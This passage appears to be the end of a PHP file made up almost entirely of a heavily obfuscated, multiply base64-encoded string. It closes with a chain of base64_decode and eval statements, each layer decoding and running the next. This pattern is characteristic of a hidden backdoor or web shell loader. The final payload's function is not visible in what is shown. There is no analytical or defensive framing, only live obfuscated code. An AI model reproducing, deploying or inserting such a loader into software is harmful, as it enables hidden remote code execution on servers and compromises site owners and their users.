Vp6RlZWbVJyV1ZkS2MxZHFSbGhXUlRWVVdUQmtTbVZWTlVoYVIyaFhaV3haTWxkVVNYaFdNa1owVTFod1ZHSllVbkpWTUZaM1lqRnNkRTVWT1doU2JYUTFXV3RTUTFsV1dqWlNXR1JhVFdwR1NGcEdWakJTUmxaMVVXMXdhVlpVVmxWV01uaHJWREpTZEZSdVVsWlhSVFZNVlc1d1ZtVkdWbFZUVkZaclZqQndkMWxVU210aVIxWldVMjVLV0dKSFVtaFpNR1JMWkVaYVdFOVZjR2xXYkhCMFZqRlNTazVYVWxoVGJsSlhZbGhDY2xWcVNqUk5iR3gwWWtWd2FrMUlhRlpWYkdoRFZVZFdWbE51U2xoaVIxSm9XVEJrUzJSR1dsaFBWWEJwVm14d2RGWXlkR3RUYlVaV1pVVlNUbE5IZUUxV2EyaFBZbXhrY2xwR1pHbFdNRnBaVkd4a05GUkdSWGRqU0U1WVVrVndXRnBGWkU5VFZsWnhWbXR3YUZkSFVYZFdSbWh6WTJzMGQySkZhRlppV0dob1dXeGtORTFXWkhOVWJUVm9WbTEwTlZadE5YTmhWMVpXWWtod1ZWWlZOWGxVYWtKelUwWldkR1ZIUm1sV00yZDRWako0VDJKdFJsaFRia1pUVmpKNFRsVnJWbGRrTVZGNllrVktZVTFIZUVsWmEyTjRVMnhGZVZwSVNscGlWRlpZVld0a1NtVlZOVmxXYTNoV1RVVnJlbFV4Vms5Vk1sWnpZa2hPVldKdGFIQlZWRUpHVGxaT1ZsUnJkRlJpUmtwNlZrZDBZVlp0U2tkU2JUVldUVlpWZUZac1dsTk9Wa1p4VVcxd2FWWldiM2hYV0hCTFVqSkdkRkpzYkZaaVdHaHdWbFJDUjJSc1RsWmhSazVzVm0xNFdWUnNhSGRoUm1SSFUyNU9XRlpGYXpGWlZFcEhWMFp3U1Zkck1WSk5SV3d6VjFaYWIxRXlVa2hUV0hCWVlsaENjRlJYZUV0a01XUnhVMVJTYWsxSGVFbFphMUpEV1ZaYU5sSnVSbHBoYTNCVVdUQmFkbVZWT1VsVWEzQlVVbXR2TVZZeFdtcE5WMVowVW14c1ZtSllhR2haYkZwaFkxWnNWbHBGV21wTlIzaEtWbGMxYzFkc1dqWldhbHBhVm0xb1ZGbHJXbkpsVmtwMVZtMTBVMDF1YUhsV1JWWlBVVEF4U0ZSdVVsTmliRnB4VkZjeE0yUXhaSE5oUms1cllsWktTVlZ0TlU5VVZrVjNVMWhvV21Wck5WaFpWVnB5WlZVNVdHUkhhRlpOTWxKMVZqRmpkMDVYUlhoalJtaGhVakpvWVZSWGNITmpiR3hYV2tkMGEyRXphRVZWVnpWcldWWlplRk51WkZoaE1rMHhXVmN4U21WV1ZuVlJiVVpPWVcxb05sVXhWbXRqTURGSFkwWnNWV0ZyU21GV2FrRXhUV3hrY2xwSVRtbGlWVzh4VlZab1ExTnNTbk5qUlU1WFVsWndXRlZ0ZUZkT1ZrWllUMVZ3YUZaR1NuVlhWekF4VmpKTmVWTlljRlppYlhoaFZtNXdWMDVzWkZkYVJUbHFVakZLU1ZadE5WTlVSa1Y0VTI1a1drMXFSbEJXVkVaM1YwWlNkVmR0Y0dsV2EzQndWMnRXYjFNeVJraFRibFpWWW10S2NsVnFSbUZqVm14eFUyeE9hbEp0T1RWVU1XUlRWRVpXTmxWdVFsVlNWVFZMV2taV2MxTkZOVlZTYld4VFpXMTBNMWRVU1hoU01sSllWRmhzVTJKWVFtOVdNRnBMWXpGc2MxUnROV2hOYTFwYVZUSXhkMVp0U2xkWGJrWmFZV3MxVEZsVVJtcGxiRloxVVcxd1UyVnJXWGxYYTJONFZESlNjMk5GYUdsU2VsWndWRlpTUTJReFVraGlSWEJxVFVkNGQxUnJaR3RoVjBwelYyNXdXbUZyTlZSYVZscHpWMFUxV1dOR2NGZE5SRll6VjJ0V2ExWXlVa1prUlZKV1ltdEtjVmxzVlRGV1JtUnpXa1U1YTJKVk5UQldWekZMWVVaa1IxTnVUbHBpUjFKUVdrZDRkMU5IU2toT1YyeE9Wa1ZLTTFaRlpITlRiVTEzWWtoQ1QxSXlVbkJaYlhoaFpXeHNjVlJzVG14V2JYaFpWR3hvZDFkc1dYZE9XR1JoVWxkU1dGcEZWakJTUmxaMVVXMXdhVlpVVmxWV01uaHJWREpTZEZSdVVsWmlWWEJ5VlRCV2QySXhiSFJPVlRscVVqRktTVlp0TUhoWlZsbDNUbGhhV0Zac2JETlpNRlkwWTBaT1dWUnJjR2hXUmtwMVYxY3dNVll5VFhsVFdIQldZbTE0WVZadWNGZE9iR1JYV2tVNWFsSXhTa2xXYlRWVFZFWkZlRk51WkZwTmFrWlFWbFJHZDFkR1VuVlhiWEJwVm10d2NGZHJWbTlUTWtaSVUyNVdWV0pyU25KVmFrWmhZMVprVjFsNlJrNVNNRnBaVmxjeFUxUkdWalpWYmtKVlVsVTFTMXBHVm5OVFJUVlZVbTFzVTJWdGRETlhWRWw0VWpKU1dGUlliRk5pV0VKdlZqQmFTMk14YkhOVWJUVm9UV3RhV2xVeU1YZFdiVXBYVjI1R1dtRnJOVXhaVkVacVpXeFdkV0pHY0ZkbGJGa3lWMVphYjFVeVNraFZhMmhRVmtWS1lWWnFUbTloTVUxNFZGUkNhRlpZYUVWVk1XaFhVMnhLTmxaWWFGcGhNazB4VkZWa1QyUkdTblZXYlhCT1lURndlRmRXV205Vk1rcElVMnhTWVUxdVVtOVdNRlozWTFaYVdFMVdaR2hpVld3MlZUSXhNRmRGTUhoWGFscGhVbTFTU0ZsWE1VcGxWbFoxVVd4c1ZrMXVVWGhWTVdSelRUSkdWbVZJUWxKaWJGcHlWbXBPYjAxc2NFWmhSWFJvVWpCd01WWkhNVzlYYXpGMFpETmtXR0pIVGpOWmFrSjNVMGRLU1dKR2NFNVdXRUo2VmpGU1NrNVhWbGRqUldSclVqSjRjRlJYZUV0ak1XUnhVMnRrYUdKVmJEVldWelZEV1ZVeGNXSkhkRlJOVlRCM1dWWldORkpHVGxsV2EzQlRaV3hXTkZkWGRHcE9WVEZJVkc1U1UySnNXbkZVVjNSaFkxWnNWMkZHVG1sU01IQlZWMnBLTUdGR1pFWmpTRVpYVm5wR1dGbFhNVXBsYkU1MFpFWm9UazFGY0hwV01uUnJZekpGZVZOWWJGVmliSEJvVldwS05HUldiSEZTV0dScVVsaG9kMVV4YUU5VGJVWlZWVzAxV21KVVZsaFpla3BLWld4V2RXSkdjRmRsYkZreVZqRmFhMVF5VGtoVmEyaFhZbXhLVFZWVVJrdGtNV3Q1VFZVNVZrMVlRbGxXUnpWaFlXMUtWMU50YkZwV2JXaFVXV3RrVG1Wc1ZuUmhSbkJPWVcxNGVWZFdXbXRoTWxKellVWlNhRTB4V2t0WlZtUXdZMFpSZW1KRlNtRk5helV3Vm0xd1EyRXhaRVpqUkVaVVZsVTFWRnBYZUhOak1WSjFZVWRzVTFORk5YVlhiWGhQVVRKS1NGTnJiRlZpV0doTFZUQm9UMkpzYTNsTlZtUk9VakZLV2xVeU5WZFRiRWw0VjIweFdGWkZhekZhUm1STFpFWmFkR05IZEZOTmJtZDVWMWN4ZDJWc2IzbFhiRkpTVmpKU2RGWlVRa2RpYkZKSllraGFZVTFWYkRWV2JUVlhXVlprUm1OSE9WaGhNazB3VjJwR2NtVlZPVmxXYTNCVFRXeEtlbGRYTUhoV01sWlhZa1pvVm1Kc2NIRlpWbFpMVVRGa2NtRkZPVTVXTUhCVlZWWmpOVmR0Vmxoa1JFWlVWbFUxUkZWcVNsTlhSVFZZWTBkb1lWVXpUakphUjNocVRVVTFjbUpGV2xaaVdHaHdWVzEwZDJNeFpGVlRWRlpzVm01Q1NsWlhOWE5YYkZvMlZtcGFXRlp0VWxCWk1HUlRVMFphZFZWcmNGTldhM0I2VjFod1MxUXlWbGhTYkd4U1lsaENiMVp1Y0hOTlZsRjVZa1ZPVWsxcmJEWlZNalZ6VjJ4VmQxTnVUbHBoTURWRVdsWmFkMWRHY0VsUmJYQk9UVlZ2TVZkWE5YTlJNazVJVTI1U1ZtSnJTbUZVVjNSaFkyeHNkV0pGVG1oTldFSlZWVmMxVDFkc1ZYZFRiRnBZVm0xU1RGbDZSbk5XUmtaelVteHdXRkpZUW5aWFYzaHJWakF4U0ZSdVVsQlhTRUpSV1ZaV1IyTnNiRmRhU0U1clZqRktTbFpYTlhOWGJGbzJWbXBhV2xadGFGUlphMXB5WlZVNVdHUkhhRmROYkVsNVZURldWMVF5UmtoVGJHeFNZbXh3UzFVd1ZrdGlNV3Q1VGxaT2FWSlhlRWxXVnpFMFUyeEplbUZIT1ZSV1YxRXdXWHBHYzFkV1pIUmxSWEJVVWxWdk1WZFdXbXBsUjBaSVZHNVNhVkl5YUV0VmJYUjNZekZ3UmxsNlZteFdNSEF3VkRCU1lWTnNTbk5UYkZKWFlrWmFWMWRxUmtOV1JrWnpWbTF3YVdKR2NIcFZNVlpYV1ZaR2MxVnJaRlZoTVhCTFZXdFNRMkpzVm5OaFJYUnNWakJzTmxVeFpHdFpWa2w0Vm0wMVdGWjZSa2hhVjNoM1ZrWkdkR1JIUmxaTlJYQjVWakZhYjFVeVVuUlVhbFpTWW14d1MxVnFSa3RqTVU1V1drVTVhMkpWY0RCV2JURjNWMnN4ZEU1VVNtdGhiVTQwV2taV2MxSnNTbkZTYlhSVFpXMTNNVlpFU25OUk1rWklWRzVTYVZJeWFIRlVWM014VFd4cmVtSkZUbE5OV0VKWlZrY3dOVmRzV2toUFZ6VlZWbXhLVDFwRldrdFRSbHAwWTBkR1YyVnJXbmRXTW5odlUyMVNSazFZUmxKWFIxSlFWVlJDUzFReGJIRlRiRTVxVW01Q01GbHJaSGRYYkZsM1RsaGtUMlZ0VG5sVU1XUkxZMFpHY1dGRmNGTldia0o2VmpGU1MySXlSa1ppUld4clRXMVNVMVl3V2xwa01XeHhWR3R3WVUxSVVuZFVNR1JyVTJ4SmVHSXphRnBpVkVaUVZGVmtSMWRGT1ZsV2EzQlRUVlZ3ZWxkWGRHOVRNa3BIWVROc1VGZEhlR2hWTUZwTFRsWmtWMWw2Um14aVIzaFpWa2MxUTJFeFNYaFhha0pVVFVVMVExbFVTa2RYUjBwSlZtMTBWRkpyYnpGV01WcHFUVmRXZEZKc2JGWmlXR2hoVkZkd2MyTnNiRmRhUjNScllUTm9SVlpYTlZkaE1WcFdUbFJLV21KVVFYZFhha0l3VmtaR2NWcEZjRkpOUlhCNVZqSjRhMWxYVGtoVGJsSlhWbnBzUzFsc1dtRmlWbVJWVTFSV2ExWXdjREJXYlRGM1lURkplV1ZFU2xwaVYzaExXWHBDTkZaV1NsbFJiRUpzVmxWd2VWWXllR3RaVjA1SVUyNVNWMVo2YkV0WmJGcGhZbFprY2xwRmNHaFdXR2hGVkZWb2MxUkdXa2xVYlRWWVlUSlNXRmxzWkVkWFJUVllaVVY0VWsxSVFucFdNRkpMVmpKU1NGUnJiRlpoYkZwTFdWWm9hMDFHVWxsaVNFcFBUVWQ0U1ZaWE1UUlpWMHBZWlVSR1dHSkZOWFZaVmxweVpWWmFkV0pIYkd4V1YzZzJWa1pXVDJOck5IZGlSV2hXWWxob2FGbHNaRFJOVm1SelZHMDFhRll3Y0hoVmJHUnpWRlpLUmxadVpGVk5NbmhEVjJwS1IxZEdaRmhhUlhoU1RWVnZlRmRyV2xkVU1sSjBVMjVTVDFORlNrdFZNR2hQWW14T2NtRkZPV2hXYkZZMlZXMDFUMU5zU2tWUmJUVlVWak5TVkZWdGVGTlNiRnB6Vm14T1ZrMUZjRWxXYkdSNlRsWlNjbUpGYkZaaWJYaGhWbTV3VjA1c1pGZGFSVGxxVWpGS1NWWnROVk5UYkVwMFZXdHdWbUpHY0V4VmJYUnpVMVpXZFdKR2NGZGxiRmt5VjFaYWIxVXlTa2RoTTJ4UVZqTlNiMVpxU2xOTmJFNVdWVmhrWVUxSGVFVlZNV2hYVTIxR1dGUnVRbFZTTW5oVVdUQmtSMWRGTlZWUmJYUlVVbGhDZGxkWE1ERlVNazVJVld0b1YySllRbkJVVjNoTFpERmtjVk5VVW10V1YzaDNWMVJLYzFWSFZsWlNiVFZVWVRKTmVGUldXbGRrUmxwMVkwZDBWMDB5WkROVk1WWlNaREZ2ZVZScmFHRlNNWEJvVmpCa2IyTXhaRmxpUnpWb1RXdHdNVlp0ZEZOaFZURnhWbXBHVlZKVk5WUmFWM2h6WXpGU2RXRkhiRkpOYmsxNlZURldUMUV3TVZoVGJsWlZZbGhvY2xWVVNtdGpiR3cyVTJ0MFYxSXdOVmxhUkU1RFZVZFdWbE51WkZoaVYzaERXV3BDYzFaR1ZuVldiWFJYWVROQ2VsZFljRTlXTWsxNVZXdFNhRTF0VW5OYVZsWkxUbFprYzJGR1RrNVdNRFV3Vkd0a2ExTnNTWGhYYlRGWVlUSlNTMVJxUW5OVFZURklXa2N4VmsxRmNIcFhWM1J2VkRKS1JtSkZiR3BOYlZKeFdXeGFXbVF4Y0VkaFJYUnJWbGQ0UlZWWE1UUlhWVEZ5VGxSS1dtSlVRWGhaYTFweVpXeFdkVkZ0YkU1aGJFVjZWVEZXYm1ReGIzbFVibEpYWVd0S2NsWXdWbmROVms1V1dYcENiRkpVYXpGVlYzQnpVMnhGZDFKcVNsUk5iWGhFVlRCYWQxZEZOVmhsUjNCcFZsWndlVmRYTlhOUk1rWjBVMWhzVDFJeVVtaFVWM2hoVFZaa2MyRkZkR2hTYmtKSlZERm9jMU5zU2xaWGJrcGFaV3MxV0ZwRlZuTlNSMFpJWTBWNFZtVnNTblZWTVZaWFdWVXhXRk51VWxWaWEwVjZWRzVzZWs1V2JIUmpTRnBoVFd0d1NWUXhaRzlaVms1R1kwaE9XRlpGYXpGYVZscDNVMGRLUlZGdFJsZGxhMXA0VmpGYWFrMVZNVVppUlZwV1lsaG9jVlJYY3pGT1ZteFhZVVZPYUdKVldsbFVNV2hYVlVkR1ZsTnJVbHBoYXpWTVdsWmFjMVpHUm5SbFIyeFNUVVZ2TVZZeWVHdGhNazVJVkZod1ZtSnRlSEJhVmxaTFpERnNkRTFXVG1wU2JYUTFWVzB4TUdGWFZsWlRia3BZWWtVMVJGbDZSbk5XUmtaelZteHdWMDFJUWpaV01WcFBVVEZXVjJKR2JGUmlWMmh3Vm1wR1dtUXhhM2xOUkZac1lYcHNkMVZXWkRCaFJsbDVaVVJHWVZKWGFGUmFWbHB6VjBVMVdXTkhhRmhTYTNCNlZqRlNTazVYUlhsU2JHaGhVMFp3UzFWc1ZURmlNV3h6WVVWT2EyRXllRXBWYlhCSFdWWlZkMU51V2xoV2JWSlFXV3RXYzFOV1RuUmxSMFpwVm14dk1WWXllR3BOVjBaMFVteG9VMVl5VW1GV1ZFSkxaV3hrVjFSclRrNVNiWGhaVlRJMVQxZHNWWGRUYm1SaFVsZFNXRnBGVm5OU01VNTBaVWQwVTJWdGR6RlhWekIzVGtVMWNtSkZaRlppUlRWWVZteGFWMkpzVmtkVWEwNVhWakExTVZadE1UUlRiRXBYWTBWT1YxSldjRkJWYlhSelVsVXhTRnBHVGxoU1dFRXhWMWR3VDFOc2IzaGpSV2hYVmpKU1lWbHNWbUZPYkdSelZHdE9hRTFZUWxWVlZ6RXdWMnhrUjFOcVNscE5NbmhFV2tkMGMxTkdWblJsUlhCVFRVUlZlVmRYTUhoV01rWnpZVE5zYVdKc2IzbFVibkJIVFZaT1ZsWnJaRTVXTVVwSlZERm9jMVZIUmxaVGJuQllZbFJCTVZsNlJuTlhWMHBJWVVWd1UxWnVRbnBXTVZKTFlqSkdSazlZUWxKWFIyaFFWVmh3UjFKc1pITmFSVGxwVWpCd1dWVXlNVFJoYlVaVlVXcFdWVlpXU2tOVVZWWnpVbXN4V1ZkdFJsTk5ibWd3VjFaYWExUXlSa2RoTTJ4cFlteHZlVlJ1Y0VkTlZrNVdZVVJPWVUxVmNEQldiVEYzWVVaSmQxWnROV0ZoTURWRVZWY3hVMWRXVm5WWGJYQm9WbFZhTkZaRmFITlJiRzk0WTBoV1YySnNXbUZVVkVaTFpERnNjVk5VUW1GTmEzQkpWREZrYjFsV1RrWmpTRTVZVmtWck1WcFdXbmRUUjBwRlVXMUdWMlZyV25oV01WcHFUVlV4Um1SRlVsSldNMUp2Vm1wS05FMVdjRVpoUms1c1ZtMTRXVlJzYUhkaFJtUkhVMjVPV0ZaRmF6RlpWRXBIVjBad1NWZHJNVkpOVlc5NFYydGFWMVF5VW5SVGJsSlBVakpTVFZaVVFrcE5NVTVXVkd0T2FFMVlRbGxXTWpWRFlWZEtWMVp1V2xSV2VrWllWMjE0Y21WVk9WbFdiV3hwVm14d2VGZHJWbXRqTWxKMFUyNUNWRmRGTlU1V2ExWlhaREZSZW1KRlRtaE5XRUpaVmpJMVEyRlhTbGRXYmxwVVZucEdXRmR0ZUhkVFJrNVlZa1V4VW1WclNURlZla1pUWld4dmVHTkZhRmRpVkVadlZtNXdWMk14VFhkVWEzUnBVbTFrTlZadE5WTmhiRTVIVTFSR1ZGWXlkM3BhUlZWNFRsZEdObHBGY0ZOTlZYQjZWakl3ZUdNeVVsZGpSbEpoVFcxNFlWUlhlR0ZPVm14MVlrVndhazFFUmtWWldIQnJVMnhKZUZOdVRsaGlWRVo2V2taYWQxWkdiM2xpUjJ4b1lURmFkMVpGVmxOU2JVNUdUMVJXVWxZeVVtOVdha1p6WW14TmQxUnNUbXRXTVVwWFZrYzFZV0ZYU2xWVmJtUlVWbGRvTmxkcVFuZFRWbEowWWtaYVRrMUdjRFpWTVZaU1pERnZkMkpJVmxWaVdHaHdWV3BHWVdOV2NFWlVhMHBxVmxkNFIxWXllRTlXVlRGRlVXMDFZVkpYYUV4WlZXUkxaRlpTZEdGR2NFNWlXR1F6VmpKNGFtUXhiM2hYV0dSb1VsWndWMWxVUmxkaWJHeFhZVVpPYVZJd2NGbFdSelZoV1ZaSmVXVklWbHBpYlhoRFZERldjMUpHUmxoaVJURm9WbGQ0TVZVeFpISk5SMFY1VW14b2FWTkdXbkpWTUZwTFRsWmtWMWw2Um14aVZWcGFWbGN4TkZkck1YRmlTRXBhVm0xU2NscEhkRFJqUms1WVRsVndhR0pyTlhWVk1WWlBWVEpTV0ZWc1pGUmlXR2h4VkZSR1lXVnNjRVpVYTBwUVZsZDRTbFZYTURGWFZURnpWMVJDV0dKSFVrOVpha0ozVTBVMVZWSnNTazVoYlhkNFYxY3hjMDB5UlhsVVdHeFVZa1pLY1ZacVRtdGtNVkY2WWtWS1lVMXNTbGxVYkdoM1dWWmtSMUp1V2xSaE1taFFXVlphVm1Wc1NuVlVhM2hYVTBVMWRWZFdXbXRYYkc5M1pFVlNVMVl6VW5CWmJYaGhWa1prYzJGRk9VNVdNSEJLVmxab1ExTnNUa2xVYlRWYVRXcEdXRlJWWkZOWFZrNTFWbXR3VWsxRmNIcFdNRkpMVlRKR1ZrOVVWbEpoYlhoTFZUQlNRMkpzWkhOYVJGSnNZa2hDVlZWWGNHdFRiRTVHWTBoT1lWSlhhRmhhVm1STFkwWkdXRnBIUmxkaGJYaDRWMWR3U2sxWFVsZGpSbWhWWVd0S2IxWnVjSE5OVmxGNllrVk9VRlpYZUVwVk1qRTBZVEZPUjFkcVZscGlWM2hFV2taVmVGWlhUWGxhUnpGV1RVVmFkVk51Y0hwaE1WWldWRmRrVVZVd1JuVlRhMXBIVVcxS2NGRlViRXBTTUhCdldYcEtWazFyTlVkUFYzUmhWakExTWxkclpGWmlNSEJHVGxSR1VrMVZWbmRVTTJ4RFlrZFNkRkp1VGt4Uk1VcFRWVlpqTUdORk9UVlplbVJoVjBad2IxbHJUbTVoTVZaV1ZGaENVR1I2TURsS2VuTnJWakozWjFCVFFXNUtSVnBZWWxOQk9VbEhTbWhqTWxVeVRrWTVhMXBYVG5aYVIxVnZTa1ZzVUdFeU9IQlBlVUpzWkcxR2MwdERVa2RXTWpCd1QzbGpOMXBZV21oaVEyZHJWakozY0U5M1BUMG5PeVJqYVNBOUlDY2tUR3hFSUQwZ1ltRnpaVFkwWDJSbFkyOWtaU2drYTNGbmFpazdJR1YyWVd3b0pFeHNSQ2s3Snp0bGRtRnNLQ1JqYVNrNyc7JEp2ID0gJyROaU0gPSBiYXNlNjRfZGVjb2RlKCRzRlRDKTsgZXZhbCgkTmlNKTsnO2V2YWwoJEp2KTs=';$Dv = '$MIA = base64_decode($meme); eval($MIA);';eval($Dv);';$wL = '$NRF = base64_decode($bptV); eval($NRF);';eval($wL);?> 
